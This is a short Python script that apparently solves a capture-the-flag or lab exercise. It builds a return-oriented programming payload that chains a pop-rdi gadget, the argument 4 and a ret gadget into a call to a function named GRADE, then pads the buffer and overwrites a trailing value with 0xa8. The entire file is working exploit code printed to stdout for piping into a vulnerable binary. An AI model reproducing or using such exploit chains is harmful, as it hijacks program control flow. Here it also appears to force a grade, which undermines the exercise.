import sys
from struct import pack

POP_RDI = 0x4018a3
RET     = 0x4018a4
GRADE   = 0x401677

buf  = pack("<Q", POP_RDI)
buf += pack("<Q", 4)
buf += pack("<Q", RET)
buf += pack("<Q", GRADE)
buf += pack("<Q", 0)
buf += b"A" * (0x100 - len(buf))
buf += pack("<I", 0xa8)

sys.stdout.buffer.write(buf + b"\n")
